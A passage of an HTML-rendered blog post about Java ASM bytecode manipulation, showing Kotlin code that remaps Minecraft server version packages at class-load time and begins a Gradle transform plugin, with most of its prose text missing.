punctuation\">,</span> local<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numStack<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> stack<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> isInterface<span class=\"token operator\">:</span> Boolean<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInvokeDynamicInsn</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> bootstrapMethodHandle<span class=\"token operator\">:</span> Handle<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> bootstrapMethodArguments<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \t\t                         <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>EmptyClassVisitorvisitMethodEmptyMethodVisitorEmptyMethodVisitorEmptyMethodVisitor</p>\n<h5 id=\"ASMVersionControl\"><a href=\"#ASMVersionControl\" class=\"headerlink\" title=\"ASMVersionControl\"></a>ASMVersionControl</h5><blockquote>\n<p>Minecraft</p>\n<p>minecraftAPI</p>\n<p></p>\n<p>Minecraft 1.16.5<code>net.minecraft.server.v1_16_R3</code></p>\n<p>Minecraft 1.12.2<code>net.minecraft.server.v1_12_R1</code></p>\n<p></p>\n<p><code>n.m.s</code>ASMVersionControl</p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<p></p>\n<p><code>ASMVersionControl</code>ASMasm<code>n.m.s</code></p>\n</blockquote>\n<p>ASM<code>ClassRemapper</code><code>ClassVisitor</code>ClassVisitor</p>\n<p>ClassRemapper<a href=\"https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt\">taboolib/MinecraftRemapper.kt at master  TabooLib/taboolib (github.com)</a></p>\n<p>ClassRemapper</p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// net.minecraft.server.v1_12_R1</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.12\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// net.minecraft.server.v1_16_R3</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.16\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>net.minecraft.server.v1_12_R1</code><code>net.minecraft.server.v1_16_R3</code></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// asm</span>\n    <span class=\"token keyword\">val</span> nmsProxy<span class=\"token operator\">:</span> NMSHandler <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    nmsProxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//  execute successfully v1.16, </span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>NMSHandlerImpl#callTest</code></p>\n<blockquote>\n<p>   L0<br>    LINENUMBER 85 L0<br>    NEW net/minecraft/server/v1_12_R1/Test<br>    DUP<br>    INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V<br>    INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg/example/asmlearn/NMSHandlerImpl; L0 L2 0<br>    MAXSTACK = 2<br>    MAXLOCALS = 1</init></p>\n</blockquote>\n<p> <code>net/minecraft/server/v1_12_R1/Test</code><code>net/minecraft/server/v1_16_R3/Test</code>visitMethod</p>\n<blockquote>\n<p></p>\n<ul>\n<li><p>NEW net/minecraft/server/v1_12_R1/Test</p>\n</li>\n<li><p>INVOKESPECIAL net/minecraft/server/v1_12_R1/Test.<init> ()V</init></p>\n</li>\n<li><p>INVOKEVIRTUAL net/minecraft/server/v1_12_R1/Test.test ()V</p>\n</li>\n</ul>\n</blockquote>\n<p><a href=\"https://www.bilibili.com/read/cv13433468\">Java ASMMethodVisitorOpcode -  (bilibili.com)</a></p>\n<p><code>visitTypeInsn</code>, <code>visitMethodInsn</code></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>:</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classVisitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> classVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> FieldVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">&gt;</span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> currentVersion<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>\n        opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        owner<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        isInterface<span class=\"token operator\">:</span> Boolean\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token punctuation\">,</span> owner<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>currentVersion<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> isInterface<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlFieldVisitor</span><span class=\"token punctuation\">(</span>fieldVisitor<span class=\"token operator\">:</span> FieldVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">FieldVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> fieldVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">val</span> nms <span class=\"token operator\">=</span> <span class=\"token string\">\"net/minecraft/server/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> obc <span class=\"token operator\">=</span> <span class=\"token string\">\"org/bukkit/craftbukkit/v1_.*?/\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">toRegex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">modifyVersion</span><span class=\"token punctuation\">(</span>version<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>nms<span class=\"token punctuation\">,</span> <span class=\"token string\">\"net/minecraft/server/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>obc<span class=\"token punctuation\">,</span> <span class=\"token string\">\"org/bukkit/craftbukkit/<span class=\"token interpolation variable\">$version</span>/\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">&gt;</span> <span class=\"token function\">createProxyClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> VersionControlClassVisitor<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">getResourceAsStream</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ClassWriter<span class=\"token punctuation\">.</span>COMPUTE_MAXS<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token function\">VersionControlClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">,</span> <span class=\"token string\">\"v1_16_R3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> MyClassLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">,</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> Class<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">inline</span> <span class=\"token keyword\">fun</span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">reified</span> T<span class=\"token operator\">&gt;</span> <span class=\"token function\">createProxyInstance</span><span class=\"token punctuation\">(</span>impl<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> T<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\"Impl\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> createProxyClass<span class=\"token operator\">&lt;</span>T<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>impl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> proxy <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    proxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>execute successfully v1.16</code>,</p>\n<p>gradleshadowJar(relocate)</p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>asm</p>\n<p>hook</p>\n<p></p>\n<p>: <a href=\"https://github.com/leavesCZY/ASM_Transform\">leavesCZY/ASM_Transform: ASM Transform  (github.com)</a></p>\n<p>android<code>transform api</code>gradle<em><strong>GradleTransformAction</strong></em>transform api</p>\n<h6 id=\"gradle\"><a href=\"#gradle\" class=\"headerlink\" title=\"gradle\"></a>gradle</h6><blockquote>\n<p>gradle</p>\n<p></p>\n</blockquote>\n<p><code>buildSrc</code><code>buildSrc</code>build.gradle</p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * @Author: leavesCZY\n * @Date: 2021/12/2 16:02\n * @Desc:\n */</span>\n<span class=\"token keyword\">class</span> DoubleClickPlugin <span class=\"token operator\">:</span> Plugin<span class=\"token operator\">&lt;</span>Project<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>project<span class=\"token operator\">:</span> Project<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> config <span class=\"token operator\">=</span> <span class=\"token function\">DoubleClickConfig</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> appExtension<span class=\"token operator\">:</span> AppExtension <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>extensions<span class=\"token punctuation\">.</span><span class=\"token function\">getByType</span><span class=\"token punctuation\">(</span><span class=\"token 